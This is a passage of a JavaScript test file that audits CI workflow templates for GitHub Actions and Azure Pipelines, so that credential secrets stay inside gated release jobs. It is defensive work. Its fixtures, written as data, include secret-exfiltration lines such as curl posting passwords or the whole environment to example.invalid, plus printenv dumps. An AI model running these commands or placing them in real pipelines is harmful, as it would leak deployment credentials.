import test from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';

// Credential variables a deployed environment declares. Each one may be mapped from a secret only by the release job or stage of its OWN
// environment: reached through the release gate, on its matching protected environment, and never in a job that checks out or installs PR code.
const exampleConfig = JSON.parse(readFileSync(new URL('../qa.config.example.json', import.meta.url), 'utf8'));
const credentialsOf = configName => new Set((exampleConfig.environments[configName]?.credentials?.identities ?? []).flatMap(i => [i.userEnv, i.passwordEnv]));
const credentialNames = new Set(Object.keys(exampleConfig.environments).flatMap(name => [...credentialsOf(name)]));
const GITHUB_RELEASE_JOBS = { staging: { environment: 'STAGING', config: 'staging' }, production: { environment: 'PROD', config: 'production' } };
const AZURE_RELEASE_STAGES = { STAGING: { environment: 'STAGING', config: 'staging' }, PROD: { environment: 'PROD', config: 'production' } };
const PR_HEAD = /github\.event\.pull_request\.head|github\.head_ref|pull_request_target|refs\/pull\//;
const INSTALLS_CODE = /\b(?:npm\s+(?:ci|install|i)|pnpm|yarn)\b/;
const dependencies = (source, key) => {
  const line = source.match(new RegExp(`^  ?  ?${key}:\\s*(.*)$`, 'm'))?.[1] ?? '';
  const listed = [...source.matchAll(new RegExp(`^  ?  ?${key}:\\s*\\n((?:\\s+-\\s*[\\w-]+\\n?)+)`, 'gm'))].flatMap(m => m[1].match(/[\w-]+/g) ?? []);
  return [...(line.match(/[\w-]+/g) ?? []), ...listed];
};

const ci = new URL('../ci/', import.meta.url);
const githubYaml = readFileSync(process.env.QA_GITHUB_TEMPLATE ?? new URL('github-actions.yml', ci), 'utf8');
const azureYaml = readFileSync(process.env.QA_AZURE_TEMPLATE ?? new URL('azure-pipelines.yml', ci), 'utf8');
const githubPublisher = readFileSync(new URL('github-publisher.yml', ci), 'utf8');
const azurePublisher = readFileSync(new URL('azure-publisher-pipeline.yml', ci), 'utf8');

function githubJobs(source) {
  const jobsAt = source.indexOf('\njobs:\n');
  assert.notEqual(jobsAt, -1, 'GitHub template must declare jobs');
  const lines = source.slice(jobsAt).split('\n');
  const jobs = [];
  let current;
  for (const line of lines) {
    const start = line.match(/^  ([A-Za-z0-9_-]+):\s*$/);
    if (start) {
      if (current) jobs.push(current);
      current = { name: start[1], source: '' };
    }
    if (current) current.source += `${line}\n`;
  }
  if (current) jobs.push(current);
  return jobs;
}

function githubCheckoutSteps(job) {
  return [...job.matchAll(/^      - uses: actions\/checkout@[^\n]*\n[\s\S]*?(?=^      - |\Z)/gm)].map(m => m[0]);
}

function azureJobs(source) {
  return [...source.matchAll(/^  - job: ([A-Za-z0-9_-]+)\s*\n([\s\S]*?)(?=^  - job: |^- stage: |\Z)/gm)]
    .map(([, name, body]) => ({ name, source: body }));
}

const githubReachesRelease = (jobs, name, seen = new Set()) => {
  if (name === 'release') return true;
  if (seen.has(name)) return false;
  seen.add(name);
  const job = jobs.find(j => j.name === name);
  return Boolean(job) && dependencies(job.source, 'needs').some(next => githubReachesRelease(jobs, next, seen));
};

// Fail closed: the release job's `if` must be one of these exact spellings (trimmed). No expression parsing, so a negation, an extra clause,
// an `||`, `always()` or any other wrapping fails by not matching. An adopter who edits the gate gets a failing audit on purpose.
const APPROVED_GITHUB_GATES = [
  "github.event_name == 'workflow_dispatch' && inputs.release == 'true'",
  "${{ github.event_name == 'workflow_dispatch' && inputs.release == 'true' }}",
];
const APPROVED_AZURE_CONDITION = "and(succeeded(), eq('${{ parameters.release }}', 'true'))";

function githubReleaseGateOk(jobs) {
  const release = jobs.find(j => j.name === 'release');
  const gate = release?.source.match(/^    if:[ \t]*(.*)$/m)?.[1]?.trim() ?? '';
  return APPROVED_GITHUB_GATES.includes(gate);
}

// The gated jobs inherit the gate through `needs`; any `if:` of their own (`always()`, `!cancelled()`) could run them with `release` skipped.
const githubJobHasOwnIf = job => /^    if:/m.test(job.source);

// Even inside its own gated job or stage, a credential may appear in exactly one place: the `env:` block of the single step that runs
// `qa.mjs test`, as `NAME: <its own secret>`. A second step, a `run:`/`script:` body, `with:`, a job-level `env:` or a variables entry that
// names a credential could send it away, so every other occurrence fails. Comment-only lines are ignored.
const indentOf = line => line.length - line.trimStart().length;
const stepRange = (lines, at) => {
  let start = at;
  while (start > 0 && !/^\s*- /.test(lines[start])) start -= 1;
  const indent = indentOf(lines[start]);
  let end = start + 1;
  while (end < lines.length && (lines[end].trim() === '' || indentOf(lines[end]) > indent)) end += 1;
  return [start, end];
};

// The one step that may carry credentials is constrained, not just scanned: exactly the keys `run`/`script` and `env` (plus an optional
// display name), a `run`/`script` value equal to the approved command below, and an `env` of only `CI: 'true'` and this environment's own
// mappings. A changed qa test command must be changed here on purpose; anything else (a second command, `shell`, `working-directory`,
// `continue-on-error`, an extra env entry) makes the step unapproved, and then no credential line is allowed anywhere.
const APPROVED_GITHUB_COMMANDS = {
  staging: 'node qa-authority/qa/bin/qa.mjs test --tier release-smoke --env staging --base-url "$STAGING_URL"',
  production: 'node qa-authority/qa/bin/qa.mjs test --tier production-sanity --env production --base-url "$PROD_URL"',
};
const APPROVED_AZURE_COMMANDS = {
  STAGING: 'node qaAuthority/qa/bin/qa.mjs test --config qaAuthority/qa/qa.config.json --tier release-smoke --env staging --base-url "$(STAGING_URL)"',
  PROD: 'node qaAuthority/qa/bin/qa.mjs test --config qaAuthority/qa/qa.config.json --tier production-sanity --env production --base-url "$(PROD_URL)"',
};
const GITHUB_STEP = { commandKey: 'run', optional: ['name'], commands: APPROVED_GITHUB_COMMANDS };
const AZURE_STEP = { commandKey: 'script', optional: ['displayName'], commands: APPROVED_AZURE_COMMANDS };

// Line numbers (0-based, within `source`) of the credential mappings that are allowed: the own-name mapping lines in the env block of the
// single, exactly approved step that runs `qa.mjs test`.
function allowedStepLines(source, ownNames, mapping, shape, approved) {
  const lines = source.split('\n');
  const testLines = lines.map((line, index) => (/qa\.mjs\s+test\b/.test(line) && !line.trim().startsWith('#') ? index : -1)).filter(index => index >= 0);
  if (testLines.length !== 1) return new Set();
  const [start, end] = stepRange(lines, testLines[0]);
  const keyIndent = indentOf(lines[start]) + 2;
  const allowed = new Set();
  const seen = new Set();
  let envIndent = null;
  for (let i = start; i < end; i += 1) {
    const text = i === start ? lines[i].replace(/^(\s*)- /, '$1  ') : lines[i];
    if (!text.trim() || text.trim().startsWith('#')) continue;
    const indent = indentOf(text);
    if (envIndent !== null && indent > envIndent) {
      if (indent <= keyIndent) return new Set();
      if (/^\s+CI:\s*'true'\s*$/.test(text)) continue;
      if ([...ownNames].some(name => mapping(name).test(text))) { allowed.add(i); continue; }
      return new Set();
    }
    envIndent = null;
    if (indent !== keyIndent) return new Set();
    const [, key, value] = text.trim().match(/^([\w-]+):\s*(.*)$/) ?? [];
    if (!key || seen.has(key)) return new Set();
    seen.add(key);
    if (key === shape.commandKey) { if (value.trim() !== approved || /^[|>]/.test(value.trim())) return new Set(); }
    else if (key === 'env') { if (value.trim() !== '') return new Set(); envIndent = keyIndent; }
    else if (!shape.optional.includes(key)) return new Set();
  }
  return seen.has(shape.commandKey) && seen.has('env') ? allowed : new Set();
}

// Every credential name in the text that is not one of the allowed lines is a violation.
function stray(label, lines, allowed) {
  const violations = [];
  lines.forEach((line, index) => {
    if (allowed.has(index) || line.trim().startsWith('#')) return;
    for (const name of credentialNames) {
      if (new RegExp(`\\b${name}\\b`).test(line)) violations.push(`${label}: credential ${name} outside the env block of the single qa test step`);
    }
  });
  return violations;
}

function credentialStepViolations(label, source, ownNames, mapping, shape, approved) {
  return [...new Set(stray(label, source.split('\n'), allowedStepLines(source, ownNames, mapping, shape, approved)))];
}

const lineOffset = (source, part) => { const at = source.indexOf(part.trimEnd()); assert.notEqual(at, -1, 'part of the file'); return source.slice(0, at).split('\n').length - 1; };
const githubMapping = name => new RegExp(`^\\s+${name}:\\s*\\$\\{\\{\\s*secrets\\.${name}\\s*\\}\\}\\s*$`);
const azureMapping = name => new RegExp(`^\\s+${name}:\\s*\\$\\(${name}\\)\\s*$`);

function githubCredentialJobAllowed(jobs, job) {
  const rule = GITHUB_RELEASE_JOBS[job.name];
  if (!rule) return false;
  const environment = job.source.match(/^    environment:\s*(\S+)\s*$/m)?.[1];
  return environment === rule.environment
    && githubReachesRelease(jobs, job.name)
    && githubReleaseGateOk(jobs)
    && !githubJobHasOwnIf(job)
    && !PR_HEAD.test(job.source)
    && !INSTALLS_CODE.test(job.source);
}

function auditGithub(source) {
  const top = source.slice(0, source.indexOf('\njobs:\n'));
  const globalWrite = /\b(?:contents|issues|pull-requests|actions):\s*write\b|permissions:\s*write-all/.test(top);
  const violations = [];
  const jobs = githubJobs(source);
  // Whole file: a credential name or secret anywhere (root env, defaults, a reusable-workflow call, container env, ...) fails unless its
  // line is an allowed mapping in the qa test step of a release job. The root is inherited by every job, PR-code jobs included.
  const allowedLines = new Set();
  for (const job of jobs) {
    if (!githubCredentialJobAllowed(jobs, job)) continue;
    const base = lineOffset(source, job.source);
    for (const index of allowedStepLines(job.source, credentialsOf(GITHUB_RELEASE_JOBS[job.name].config), githubMapping, GITHUB_STEP, APPROVED_GITHUB_COMMANDS[job.name])) allowedLines.add(base + index);
  }
  violations.push(...stray('github', source.split('\n'), allowedLines));
  const rootLines = top.split('\n');
  rootLines.forEach(line => {
    if (!line.trim().startsWith('#') && /\bsecrets\./.test(line)) violations.push('github: a secret in the workflow root reaches every job');
  });
  source.split('\n').forEach(line => {
    if (/^\s*secrets:\s*inherit\b/.test(line)) violations.push('github: secrets: inherit passes every secret to a called workflow');
  });
  for (const job of jobs) {
    // Credential secrets: checked in every job, so a job that does not look like PR code cannot carry one either.
    const own = GITHUB_RELEASE_JOBS[job.name] ? credentialsOf(GITHUB_RELEASE_JOBS[job.name].config) : new Set();
    const eligible = githubCredentialJobAllowed(jobs, job);
    let scanned = job.source;
    if (eligible) violations.push(...credentialStepViolations(`github:${job.name}`, job.source, own, githubMapping, GITHUB_STEP, APPROVED_GITHUB_COMMANDS[job.name]));
    for (const [, name] of job.source.matchAll(/\$\{\{\s*secrets\.(\w+)\s*\}\}/g)) {
      if (!credentialNames.has(name)) continue;
      if (eligible && own.has(name)) scanned = scanned.replace(new RegExp(`\\$\\{\\{\\s*secrets\\.${name}\\s*\\}\\}`, 'g'), '');
      else if (!violations.includes(`github:${job.name}: credential secret ${name} outside its own release job`)) violations.push(`github:${job.name}: credential secret ${name} outside its own release job`);
    }
    const prCheckout = githubCheckoutSteps(job.source).some(step => /github\.event\.pull_request\.head\.sha/.test(step));
    const runsPrCode = prCheckout || /\bnpm\s+(?:ci|install)\b/.test(job.source)
      || /qa(?:-authority)?\/qa\/bin\/qa\.mjs\s+test\b/.test(job.source)
      || (job.name === 'qa-repository-pr' && /github\.event_name\s*==\s*'pull_request'/.test(job.source));
    if (!runsPrCode) { continue; }
    if (globalWrite || /\b(?:contents|issues|pull-requests|actions):\s*write\b|permissions:\s*write-all/.test(job.source)) {
      violations.push(`github:${job.name}: write permission`);
    }
    for (const step of githubCheckoutSteps(job.source)) {
      if (!/persist-credentials:\s*false/.test(step)) violations.push(`github:${job.name}: checkout credentials not disabled`);
    }
    if (/\$\{\{\s*secrets\.|\b(?:QA_BOARD_\w*TOKEN|QA_READ_TOKEN|SYSTEM_ACCESSTOKEN)\b/.test(scanned)) {
      violations.push(`github:${job.name}: secret or board token reaches PR-code job`);
    }
  }
  return violations;
}

function azureStages(source) {
  return [...source.matchAll(/^- stage: ([A-Za-z0-9_-]+)\s*\n([\s\S]*?)(?=^- stage: |$(?![\s\S]))/gm)].map(([, name, body]) => ({ name, source: body }));
}

const azureReachesDev = (stages, name, seen = new Set()) => {
  if (name === 'DEV') return true;
  if (seen.has(name)) return false;
  seen.add(name);
  const stage = stages.find(st => st.name === name);
  return Boolean(stage) && dependencies(stage.source, 'dependsOn').some(next => azureReachesDev(stages, next, seen));
};

const azureGated = stage => (stage.source.match(/^  condition:[ \t]*(.*)$/m)?.[1]?.trim() ?? '') === APPROVED_AZURE_CONDITION;

function azureCredentialStageAllowed(stages, stage) {
  const rule = AZURE_RELEASE_STAGES[stage.name];
  if (!rule) return false;
  const environment = stage.source.match(/^    environment:\s*(\S+)\s*$/m)?.[1];
  const dev = stages.find(st => st.name === 'DEV');
  return environment === rule.environment
    && azureReachesDev(stages, stage.name)
    && azureGated(stage)
    && Boolean(dev) && azureGated(dev)
    && !/checkout:\s*self\b/.test(stage.source)
    && !INSTALLS_CODE.test(stage.source);
}

function auditAzureCredentials(source) {
  const violations = [];
  const stages = azureStages(source);
  // Whole file: a credential name anywhere (root variables, parameters, another stage) fails unless its line is an allowed mapping, and a
  // variable group may be listed only in the stage of its own environment.
  const allowedLines = new Set();
  const groupHomes = { 'qa-staging-credentials': 'STAGING', 'qa-production-credentials': 'PROD' };
  for (const stage of stages) {
    if (!azureCredentialStageAllowed(stages, stage)) continue;
    const base = lineOffset(source, stage.source);
    for (const index of allowedStepLines(stage.source, credentialsOf(AZURE_RELEASE_STAGES[stage.name].config), azureMapping, AZURE_STEP, APPROVED_AZURE_COMMANDS[stage.name])) allowedLines.add(base + index);
  }
  violations.push(...stray('azure', source.split('\n'), allowedLines));
  source.split('\n').forEach((line, index) => {
    const group = line.match(/^\s*-?\s*group:\s*(\S+)/)?.[1];
    if (!group) return;
    const home = stages.find(st => lineOffset(source, st.source) <= index && index < lineOffset(source, st.source) + st.source.split('\n').length)?.name;
    if (groupHomes[group] !== home) violations.push(`azure: variable group ${group} listed outside its own release stage`);
  });
  for (const stage of stages) {
    const own = AZURE_RELEASE_STAGES[stage.name] ? credentialsOf(AZURE_RELEASE_STAGES[stage.name].config) : new Set();
    const allowed = azureCredentialStageAllowed(stages, stage);
    if (allowed) violations.push(...credentialStepViolations(`azure:${stage.name}`, stage.source, own, azureMapping, AZURE_STEP, APPROVED_AZURE_COMMANDS[stage.name]));
    for (const name of credentialNames) {
      if (allowed && own.has(name)) continue;
      if (!new RegExp(`\\b${name}\\b`).test(stage.source)) continue;
      if (!(allowed && own.has(name))) violations.push(`azure:${stage.name}: credential variable ${name} outside its own release stage`);
    }
  }
  return violations;
}

function auditAzure(source) {
  const violations = auditAzureCredentials(source);
  for (const job of azureJobs(source)) {
    const runsPrCode = /checkout:\s*self\b/.test(job.source) || /\bnpm\s+(?:ci|install)\b/.test(job.source)
      || /qaAuthority\/qa\/bin\/qa\.mjs\s+test\b/.test(job.source);
    if (!runsPrCode) continue;
    if (/System\.AccessToken|QA_BOARD_\w*TOKEN|QA_READ_TOKEN|AZURE_DEVOPS_EXT_PAT/.test(job.source)) {
      violations.push(`azure:${job.name}: secret or board token reaches PR-code job`);
    }
    if (/checkout:\s*self\b/.test(job.source) && !/-\s*checkout:\s*self[\s\S]{0,180}?persistCredentials:\s*false/.test(job.source)) {
      violations.push(`azure:${job.name}: checkout credentials not explicitly disabled`);
    }
  }
  return violations;
}

test('PR-code CI jobs have read-only permissions, no persisted credentials, and no secrets', () => {
  const violations = [...auditGithub(githubYaml), ...auditAzure(azureYaml)];
  assert.deepEqual(violations, [], `unsafe PR-code jobs: ${violations.join('; ')}`);
});

test('only declared credential secrets are allowed in a release job, and only with a protected environment', () => {
  const staging = githubJobs(githubYaml).find(job => job.name === 'staging').source;
  assert.match(staging, /secrets\.QA_STAGING_USER/);
  assert.deepEqual(auditGithub(githubYaml), []);
  const stolen = githubYaml.replace('QA_STAGING_PASSWORD: ${{ secrets.QA_STAGING_PASSWORD }}', 'QA_STAGING_PASSWORD: ${{ secrets.QA_STAGING_PASSWORD }}\n          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}');
  assert.match(auditGithub(stolen).join(';'), /github:staging: secret/);
  const unprotected = githubYaml.replace('    environment: STAGING\n    steps:\n      - run: ./deploy.sh STAGING', '    steps:\n      - run: ./deploy.sh STAGING');
  assert.notEqual(unprotected, githubYaml);
  assert.match(auditGithub(unprotected).join(';'), /github:staging: credential secret/);
});

const prCodeJob = (environment, secret) => `  pr-code:
    runs-on: ubuntu-latest
    environment: ${environment}
    steps:
      - uses: actions/checkout@v4
        with:
          ref: \${{ github.event.pull_request.head.sha }}
          persist-credentials: false
      - run: npm ci
      - run: node qa-authority/qa/bin/qa.mjs test
        env:
          ${secret}: \${{ secrets.${secret} }}
`;

test('the real GitHub and Azure templates pass the credential audit', () => {
  assert.deepEqual(auditGithub(githubYaml), []);
  assert.deepEqual(auditAzure(azureYaml), []);
  assert.deepEqual(auditAzureCredentials(azureYaml), []);
});

test('GitHub audit rejects a credential secret anywhere but its own gated release job', () => {
  const real = githubYaml.endsWith('\n') ? githubYaml : `${githubYaml}\n`;
  const withPrCode = job => `${real}${job}`;
  const mutate = (from, to) => { assert.ok(githubYaml.includes(from), from); return githubYaml.replace(from, to); };
  const fixtures = {
    'PR-code job with PR-head checkout, npm ci, environment STAGING and a production secret': withPrCode(prCodeJob('STAGING', 'QA_PRODUCTION_PASSWORD')),
    'PR-code job with PR-head checkout, npm ci and its own environment secret': withPrCode(prCodeJob('STAGING', 'QA_STAGING_PASSWORD')),
    'staging job mapping production credentials': mutate('QA_STAGING_PASSWORD: ${{ secrets.QA_STAGING_PASSWORD }}', 'QA_STAGING_PASSWORD: ${{ secrets.QA_PRODUCTION_PASSWORD }}'),
    'production job mapping staging credentials': mutate('QA_PRODUCTION_PASSWORD: ${{ secrets.QA_PRODUCTION_PASSWORD }}', 'QA_PRODUCTION_PASSWORD: ${{ secrets.QA_STAGING_PASSWORD }}'),
    'a new job with another name on environment STAGING': withPrCode('  smoke:\n    runs-on: ubuntu-latest\n    environment: STAGING\n    steps:\n      - run: echo ok\n        env:\n          QA_STAGING_PASSWORD: ${{ secrets.QA_STAGING_PASSWORD }}\n'),
    'staging job without its needs chain to release': mutate('  staging:\n    needs: release\n', '  staging:\n'),
    'staging job needing something that never reaches release': mutate('  staging:\n    needs: release\n', '  staging:\n    needs: plan\n'),
    'staging job on the wrong environment': mutate('    environment: STAGING\n    steps:\n      - run: ./deploy.sh STAGING', '    environment: PROD\n    steps:\n      - run: ./deploy.sh STAGING'),
    'release gate no longer requires the release input': mutate(" && inputs.release == 'true'", ''),
    'release gate negated as a whole': mutate("if: github.event_name == 'workflow_dispatch' && inputs.release == 'true'", "if: ${{ !(github.event_name == 'workflow_dispatch' && inputs.release == 'true') }}"),
    'release gate negated without a wrapper': mutate("if: github.event_name == 'workflow_dispatch' && inputs.release == 'true'", "if: !(github.event_name == 'workflow_dispatch' && inputs.release == 'true')"),
    'release gate with ! before the release input': mutate("&& inputs.release == 'true'", "&& !inputs.release == 'true'"),
    'release gate with an extra comparison clause': mutate("&& inputs.release == 'true'", "&& (inputs.release == 'true') == false"),
    'release gate led by always()': mutate("if: github.event_name == 'workflow_dispatch' && inputs.release == 'true'", "if: always() && github.event_name == 'workflow_dispatch' && inputs.release == 'true'"),
    'release gate wrapped in an expression with an extra clause': mutate("if: github.event_name == 'workflow_dispatch' && inputs.release == 'true'", "if: ${{ github.event_name == 'workflow_dispatch' && inputs.release == 'true' || true }}"),
    'staging job with if always()': mutate('  staging:\n    needs: release\n', '  staging:\n    needs: release\n    if: always()\n'),
    'staging job with if not cancelled': mutate('  staging:\n    needs: release\n', '  staging:\n    needs: release\n    if: ${{ !cancelled() }}\n'),
    'production job with if always()': mutate('  production:\n    needs: staging\n', '  production:\n    needs: staging\n    if: always()\n'),
    'release gate opened with an or': mutate("inputs.release == 'true'", "inputs.release == 'true' || github.event_name == 'pull_request'"),
    'staging job that checks out the PR head': mutate('  staging:\n    needs: release\n    runs-on: ubuntu-latest\n    environment: STAGING\n    steps:\n', '  staging:\n    needs: release\n    runs-on: ubuntu-latest\n    environment: STAGING\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n          persist-credentials: false\n'),
    'staging job that installs PR code': mutate('      - run: ./deploy.sh STAGING "${{ github.sha }}"\n', '      - run: ./deploy.sh STAGING "${{ github.sha }}"\n      - run: npm ci\n'),
    'staging job that installs with pnpm': mutate('      - run: ./deploy.sh STAGING "${{ github.sha }}"\n', '      - run: pnpm install\n'),
  };
  for (const [name, yaml] of Object.entries(fixtures)) {
    const violations = auditGithub(yaml);
    assert.ok(violations.length > 0, `rejected: ${name}`);
  }
});

test('GitHub audit rejects a second step in the release job that can send a credential away', () => {
  const mutate = (from, to) => { assert.ok(githubYaml.includes(from), from); return githubYaml.replace(from, to); };
  const beforeProduction = extra => mutate('  production:\n    needs: staging\n', `${extra}  production:\n    needs: staging\n`);
  const fixtures = {
    'a second step with the credential in its own env': beforeProduction('      - run: ./notify.sh\n        env:\n          QA_STAGING_PASSWORD: ${{ secrets.QA_STAGING_PASSWORD }}\n'),
    'a second step with the secret inline in its run': beforeProduction('      - run: curl -d "${{ secrets.QA_STAGING_PASSWORD }}" https://example.invalid\n'),
    'a second step that posts the mapped variable': beforeProduction('      - run: curl -d "$QA_STAGING_PASSWORD" https://example.invalid\n        env:\n          QA_STAGING_PASSWORD: ${{ secrets.QA_STAGING_PASSWORD }}\n'),
    'a second step passing the user through with': beforeProduction('      - uses: example/notify@v1\n        with:\n          token: ${{ secrets.QA_STAGING_USER }}\n'),
    'a job-level env mapping': mutate('    environment: STAGING\n    steps:\n', '    environment: STAGING\n    env:\n      QA_STAGING_PASSWORD: ${{ secrets.QA_STAGING_PASSWORD }}\n    steps:\n'),
    'the qa test step run also posting the password': mutate('--base-url "$STAGING_URL"\n', '--base-url "$STAGING_URL" && curl -d "$QA_STAGING_PASSWORD" https://example.invalid\n'),
    'two qa test steps': beforeProduction('      - run: node qa-authority/qa/bin/qa.mjs test --tier release-smoke --env staging --base-url "$STAGING_URL"\n        env:\n          QA_STAGING_PASSWORD: ${{ secrets.QA_STAGING_PASSWORD }}\n'),
    'the mapping moved out of the env block into the step with': mutate('        env:\n          CI: \'true\'\n          QA_STAGING_USER:', '        with:\n          CI: \'true\'\n          QA_STAGING_USER:'),
  };
  for (const [name, yaml] of Object.entries(fixtures)) {
    assert.ok(auditGithub(yaml).length > 0, `rejected: ${name}`);
  }
});

test('GitHub audit rejects any change to the approved qa test step', () => {
  const mutate = (from, to) => { assert.ok(githubYaml.includes(from), from); return githubYaml.replace(from, to); };
  const run = '      - run: node qa-authority/qa/bin/qa.mjs test --tier release-smoke --env staging --base-url "$STAGING_URL"\n';
  const fixtures = {
    'a command appended with && env | curl': mutate('--base-url "$STAGING_URL"\n', '--base-url "$STAGING_URL" && env | curl -d @- https://example.invalid\n'),
    'a command appended with ; printenv': mutate('--base-url "$STAGING_URL"\n', '--base-url "$STAGING_URL"; printenv > out.txt\n'),
    'a multi-line run with the approved command and another line': mutate(run, '      - run: |\n          node qa-authority/qa/bin/qa.mjs test --tier release-smoke --env staging --base-url "$STAGING_URL"\n          printenv > out.txt\n'),
    'a shell override': mutate(run, '      - shell: bash -c "env > out.txt; $0"\n        run: node qa-authority/qa/bin/qa.mjs test --tier release-smoke --env staging --base-url "$STAGING_URL"\n'),
    'a working-directory in PR-controlled code': mutate(run, '      - working-directory: app\n        run: node qa-authority/qa/bin/qa.mjs test --tier release-smoke --env staging --base-url "$STAGING_URL"\n'),
    'an extra env entry': mutate("          CI: 'true'\n          QA_STAGING_USER", "          CI: 'true'\n          EXTRA: x\n          QA_STAGING_USER"),
    'continue-on-error': mutate(run, '      - continue-on-error: true\n        run: node qa-authority/qa/bin/qa.mjs test --tier release-smoke --env staging --base-url "$STAGING_URL"\n'),
    'an if on the step': mutate(run, '      - if: always()\n        run: node qa-authority/qa/bin/qa.mjs test --tier release-smoke --env staging --base-url "$STAGING_URL"\n'),
    'a changed tier': mutate('--tier release-smoke --env staging', '--tier everything --env staging'),
    'a uses key beside run': mutate(run, '      - uses: example/x@v1\n        run: node qa-authority/qa/bin/qa.mjs test --tier release-smoke --env staging --base-url "$STAGING_URL"\n'),
  };
  assert.deepEqual(auditGithub(githubYaml), []);
  for (const [name, yaml] of Object.entries(fixtures)) {
    assert.ok(auditGithub(yaml).length > 0, `rejected: ${name}`);
  }
});

test('Azure audit rejects any change to the approved qa test step', () => {
  const mutate = (from, to) => { assert.ok(azureYaml.includes(from), from); return azureYaml.replace(from, to); };
  const script = '          - script: node qaAuthority/qa/bin/qa.mjs test --config qaAuthority/qa/qa.config.json --tier release-smoke --env staging --base-url "$(STAGING_URL)"\n';
  const fixtures = {
    'a command appended with && env | curl': mutate('--base-url "$(STAGING_URL)"\n', '--base-url "$(STAGING_URL)" && env | curl -d @- https://example.invalid\n'),
    'a command appended with ; printenv': mutate('--base-url "$(STAGING_URL)"\n', '--base-url "$(STAGING_URL)"; printenv > out.txt\n'),
    'a multi-line script with the approved command and another line': mutate(script, '          - script: |\n              node qaAuthority/qa/bin/qa.mjs test --config qaAuthority/qa/qa.config.json --tier release-smoke --env staging --base-url "$(STAGING_URL)"\n              printenv > out.txt\n'),
    'a working directory in PR-controlled code': mutate(script, '          - workingDirectory: app\n            script: node qaAuthority/qa/bin/qa.mjs test --config qaAuthority/qa/qa.config.json --tier release-smoke --env staging --base-url "$(STAGING_URL)"\n'),
    'an extra env entry': mutate("              CI: 'true'\n              QA_STAGING_USER", "              CI: 'true'\n              EXTRA: x\n              QA_STAGING_USER"),
    'continueOnError': mutate(script, '          - continueOnError: true\n            script: node qaAuthority/qa/bin/qa.mjs test --config qaAuthority/qa/qa.config.json --tier release-smoke --env staging --base-url "$(STAGING_URL)"\n'),
    'a condition on the step': mutate(script, '          - condition: always()\n            script: node qaAuthority/qa/bin/qa.mjs test --config qaAuthority/qa/qa.config.json --tier release-smoke --env staging --base-url "$(STAGING_URL)"\n'),
    'a changed tier': mutate('--tier release-smoke --env staging', '--tier everything --env staging'),
  };
  assert.deepEqual(auditAzure(azureYaml), []);
  for (const [name, yaml] of Object.entries(fixtures)) {
    assert.ok(auditAzure(yaml).length > 0, `rejected: ${name}`);
  }
});

test('GitHub audit rejects a credential or secret that reaches the jobs through the workflow root or a call', () => {
  const mutate = (from, to) => { assert.ok(githubYaml.includes(from), from); return githubYaml.replace(from, to); };
  const beforeJobs = extra => mutate('\njobs:\n', `\n${extra}jobs:\n`);
  const fixtures = {
    'root env mapping a credential': beforeJobs('env:\n  QA_STAGING_PASSWORD: ${{ secrets.QA_STAGING_PASSWORD }}\n'),
    'root env mapping an undeclared secret': beforeJobs('env:\n  DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}\n'),
    'root defaults referencing a credential': beforeJobs('defaults:\n  run:\n    shell: bash -c "echo $QA_PRODUCTION_PASSWORD"\n'),
    'workflow_call secrets declaring a credential': mutate('\njobs:\n', '\n# note\njobs:\n').replace('on:\n', 'on:\n  workflow_call:\n    secrets:\n      QA_STAGING_PASSWORD:\n        required: true\n'),
    'secrets inherit to a reusable workflow': githubYaml.replace(/\n$/, '') + '\n  reuse:\n    uses: ./.github/workflows/other.yml\n    secrets: inherit\n',
    'a job container env credential': mutate('  staging:\n    needs: release\n', '  staging:\n    needs: release\n    container:\n      image: node:22\n      env:\n        QA_STAGING_PASSWORD: ${{ secrets.QA_STAGING_PASSWORD }}\n'),
    'a PR-code job service env credential': mutate('  test:\n', '  test:\n    services:\n      db:\n        image: postgres\n        env:\n          QA_PRODUCTION_PASSWORD: ${{ secrets.QA_PRODUCTION_PASSWORD }}\n'),
  };
  assert.deepEqual(auditGithub(githubYaml), []);
  for (const [name, yaml] of Object.entries(fixtures)) {
    assert.ok(auditGithub(yaml).length > 0, `rejected: ${name}`);
  }
});

test('Azure audit rejects a credential or variable group outside its own release stage', () => {
  const mutate = (from, to) => { assert.ok(azureYaml.includes(from), from); return azureYaml.replace(from, to); };
  const fixtures = {
    'root variables copying a credential': mutate('\nvariables:\n', '\nvariables:\n- name: copy\n  value: $(QA_STAGING_PASSWORD)\n'),
    'a top-level variable group of the staging credentials': mutate('\nvariables:\n', '\nvariables:\n- group: qa-staging-credentials\n'),
    'the staging group listed in the PROD stage': mutate('  - group: qa-production-credentials\n', '  - group: qa-production-credentials\n  - group: qa-staging-credentials\n'),
    'a template parameter named after a credential': mutate('\nparameters:\n', '\nparameters:\n- name: QA_STAGING_PASSWORD\n  type: string\n  default: x\n'),
    'a PR-code stage reading a credential': mutate('- stage: Test\n', '- stage: Test\n  variables:\n    leak: $(QA_PRODUCTION_PASSWORD)\n'),
  };
  assert.deepEqual(auditAzure(azureYaml), []);
  for (const [name, yaml] of Object.entries(fixtures)) {
    assert.ok(auditAzure(yaml).length > 0, `rejected: ${name}`);
  }
});

test('Azure audit rejects a second step in the release stage that can send a credential away', () => {
  const mutate = (from, to) => { assert.ok(azureYaml.includes(from), from); return azureYaml.replace(from, to); };
  const beforeProd = extra => mutate('- stage: PROD\n', `${extra}- stage: PROD\n`);
  const stagingStep = extra => mutate('              QA_STAGING_PASSWORD: $(QA_STAGING_PASSWORD)\n', `              QA_STAGING_PASSWORD: $(QA_STAGING_PASSWORD)\n${extra}`);
  const fixtures = {
    'a second step with the credential in its own env': stagingStep('          - script: ./notify.sh\n            env:\n              QA_STAGING_PASSWORD: $(QA_STAGING_PASSWORD)\n'),
    'a second step with the variable inline in its script': stagingStep('          - script: curl -d "$(QA_STAGING_PASSWORD)" https://example.invalid\n'),
    'a second step that posts the mapped variable': stagingStep('          - script: curl -d "$QA_STAGING_PASSWORD" https://example.invalid\n            env:\n              QA_STAGING_PASSWORD: $(QA_STAGING_PASSWORD)\n'),
    'a stage variable that copies the credential': mutate('  - group: qa-staging-credentials\n', '  - group: qa-staging-credentials\n  - name: copy\n    value: $(QA_STAGING_PASSWORD)\n'),
    'a job-level variable that copies the credential': mutate('    environment: STAGING\n', '    variables:\n      copy: $(QA_STAGING_PASSWORD)\n    environment: STAGING\n'),
